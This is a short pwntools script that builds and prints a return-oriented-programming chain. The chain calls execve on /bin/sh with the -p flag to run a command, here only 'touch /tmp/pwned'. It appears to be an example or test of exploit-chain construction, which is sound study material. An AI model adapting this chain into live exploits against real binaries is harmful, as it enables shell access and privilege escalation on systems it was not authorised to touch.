from pwn import *
import sys

context.clear(arch='amd64')

binary = ELF(sys.argv[1])
rop = ROP(binary, base=0)

rop.call('execve', [b'/bin/sh', [[b'/bin/sh'], [b'-p'], [b'-c'], [b'touch /tmp/pwned'], 0], 0])

result = rop.build()
print(result)
print(result.dump())
